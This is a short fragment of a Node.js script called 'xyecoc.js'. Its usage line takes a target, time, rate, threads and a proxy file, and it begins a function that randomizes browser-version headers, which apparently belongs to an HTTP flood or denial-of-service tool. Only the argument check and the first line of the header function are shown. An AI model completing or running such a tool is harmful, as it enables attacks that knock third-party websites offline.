...
if (process.argv.length < 7) {
     console.log("xyecoc.js // Author @TPAXEP764 // 26 September");
     console.log("usage: node xyecoc.js [target] [time] [rate] [threads] [proxy-file] <arguments>");
...
function generate_headers() {
     const version = Math.floor(Math.random() * 4) + 130; //130-134
